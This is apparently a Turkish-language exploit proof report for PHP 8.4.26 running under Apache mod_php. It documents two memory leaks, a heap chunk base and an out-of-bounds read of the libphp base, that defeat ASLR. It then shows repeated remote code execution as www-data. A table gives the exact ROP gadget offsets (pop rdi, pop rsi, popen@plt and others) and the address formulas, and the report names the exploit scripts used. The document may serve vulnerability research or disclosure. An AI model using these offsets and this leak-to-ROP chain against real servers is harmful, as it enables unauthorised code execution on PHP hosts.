# ASLR atlatma kanıtı (PHP 8.4.26 / Apache mod_php)

## Ortam

```text
personality = 00000000   # ASLR açık
Apache 2.4.68 prefork, tek worker
PHP 8.4.26 (kaynaktan derleme, libphp.so)
```

## Sızıntı 1: Zend MM chunk base

`/leak.php` 929 bayt döndürür, bunun içinde `s:775:"`'den sonraki 775 bayt heap işaretçisi içerir.

Fiilî ASLR:

```text
first ptrs: 0x7fd3e62013a0, 0x7fd3e62013c0, ...
masked bases: 0x7fd3e6200000 (48 işaretçi)
```

`/proc/<child>/maps`:

```text
7fd3e6200000-7fd3e6400000 rw-p 00000000 00:00 0
```

İkisi tutarlı (2MB hizalı Zend MM chunk).

## Sızıntı 2: libphp base

`/leak_libc.php?mode=file_first` 32815 bayt döndürür, bunun içinde `s:32768:"`'den sonraki 32768 bayt kontrollü uzunluklu OOB okumadır.

Fiilî ASLR:

```text
payload offset 0x1fe8 = 0x7fd3e7fb6309
libphp_base = 0x7fd3e7fb6309 - 0x5b6309 = 0x7fd3e7a00000
```

`/proc/<child>/maps`:

```text
7fd3e7a00000-7fd3e7b4f000 r--p 00000000 ... /usr/lib/apache2/modules/libphp.so
```

Tamamen tutarlı.

## Tam ASLR exploit'i

Mevcut master (personality=0):

```text
anchor 0x7f17fe3b6309 hb 0x7f17fc600000 lb 0x7f17fde00000 S 0x7f17fc603780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
(ardışık 3/3)
```

Yepyeni Apache master'ı yeniden başlatma:

```text
anchor 0x7fd3e7fb6309 hb 0x7fd3e6200000 lb 0x7fd3e7a00000 S 0x7fd3e6203780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
(ardışık 2/2)
```

## Kilit formüller/offset'ler (bu build)

| Öğe | Değer |
|---|---|
| heap chunk base | `mode(leaked_ptr & ~0x1fffff)` |
| libphp base | `qword(payload[0x1fe8]) - 0x5b6309` |
| exploit isteğinin S'si | `chunk_base + 0x3780` |
| `leave; ret` | libphp + `0x21ef23` |
| `pop rdi; ret` | libphp + `0x15e492` |
| `pop rsi; ret` | libphp + `0x15d1a3` |
| `ret` (hizalama) | libphp + `0x15a029` |
| `popen@plt` | libphp + `0x1504d0` |
| `exit@plt` | libphp + `0x155780` |

## Scriptler

- `tools/leak.php`
- `tools/leak_libc.php`
- `tools/dyn_payload.php`
- `tools/aslr_run2.py`

## Notlar

- Varsayılan `session.serialize_handler=php`, GH-16590'ı düzeltmiştir; sızıntı `php_serialize` kardeş yolunu kullanır (8.4.26'da hâlâ mevcut).
- `S_OFF=0x3780`, "iki sızıntı isteğinden sonra, `dyn_payload.php` isteği"nin fiilî ölçüm değeridir; istek sırası/script değişince yeniden kalibrasyon gerekir.
- Aynı Apache master'ı altında worker yeniden kurulduktan sonra hb/lb değişmez (prefork eşlemeyi devralır); master yeniden başlatıldığında değişir, sızıntı otomatik uyarlanır.
